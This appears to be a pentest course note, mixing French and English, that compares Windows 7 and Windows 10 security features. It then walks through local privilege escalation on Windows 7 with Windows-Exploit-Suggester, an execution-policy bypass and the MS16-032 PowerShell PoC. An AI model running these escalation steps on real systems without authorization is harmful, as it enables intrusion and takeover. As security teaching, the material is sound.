# Windows Desktop Versions

***

### <mark style="color:red;">Windows 7 vs. Newer Versions</mark>

Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.

<table data-full-width="true"><thead><tr><th>Feature</th><th>Windows 7</th><th>Windows 10</th></tr></thead><tbody><tr><td><a href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/">Microsoft Password (MFA)</a></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview">BitLocker</a></td><td>Partial</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td><td></td><td>X</td></tr><tr><td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td><td>Partial</td><td>X</td></tr><tr><td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td><td>Partial</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td><td></td><td>X</td></tr></tbody></table>

***

### <mark style="color:red;">Windows 7 Case Study</mark>

* En 2020, **plus de 100 millions d’utilisateurs** étaient encore sur Windows 7.
* Windows 7 était le **deuxième OS le plus utilisé** sur les postes de travail après Windows 10 (source : NetMarketShare, nov. 2020).
* Il est courant dans les **grandes entreprises** des secteurs comme :
  * Éducation
  * Distribution (retail)
  * Transport
  * Santé
  * Finance
  * Gouvernement
  * Industrie

***

#### <mark style="color:green;">🛡 Rôle du pentester face aux systèmes EOL (fin de vie)</mark>

* Le pentester doit **comprendre le contexte métier du client**, ses contraintes et sa tolérance au risque.
* Il ne suffit pas de signaler la présence de Windows 7 avec une simple recommandation de mise à jour.
* Il est nécessaire de **discuter avec le client** pour :
  * Comprendre pourquoi ces systèmes sont encore utilisés
  * Adapter les recommandations en conséquence

***

#### <mark style="color:green;">⚙️ Exemples de contexte</mark>

* Un **grand distributeur** peut avoir des appareils sous Windows 7 embarqué dans des centaines de magasins (ex : caisses POS).
  * Solution immédiate impossible → chercher des **mesures de mitigation**.
* Un **cabinet d’avocats** avec une seule machine Windows 7 → peut la retirer ou la mettre à jour facilement.

***

#### <mark style="color:green;">🔍 Ciblage technique</mark>

* **Sherlock** : pour détecter les vulnérabilités connues
* **Windows-Exploit-Suggester** : outil basé sur `systeminfo` pour suggérer des exploits liés aux correctifs manquants

<mark style="color:green;">**Install Python Dependencies (local VM only)**</mark>

```shell-session
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install

sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install
```

<mark style="color:green;">**Gathering Systeminfo Command Output**</mark>

```cmd-session
C:\htb> systeminfo
```

<mark style="color:green;">**Updating the Local Microsoft Vulnerability Database**</mark>

```shell-session
sudo python2.7 windows-exploit-suggester.py --update
```

<mark style="color:green;">**Running Windows Exploit Suggester**</mark>

{% code fullWidth="true" %}
```shell-session
 python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
```
{% endcode %}

{% hint style="info" %}
Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.

Looking through the results, we can see a rather extensive list, some Metasploit modules, and some standalone PoC exploits. We must filter through the noise, remove any Denial of Service exploits, and exploits that do not make sense for our target OS. One that stands out immediately as interesting is MS16-032. A detailed explanation of this bug can be found in this [Project Zero blog post](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html) which is a bug in the Secondary Logon Service.
{% endhint %}

<mark style="color:green;">**Exploiting MS16-032 with PowerShell PoC**</mark>

Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.

```powershell-session
Set-ExecutionPolicy bypass -scope process

Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

<mark style="color:green;">**Spawning a SYSTEM Console**</mark>

```cmd-session
C:\htb> whoami
```

***
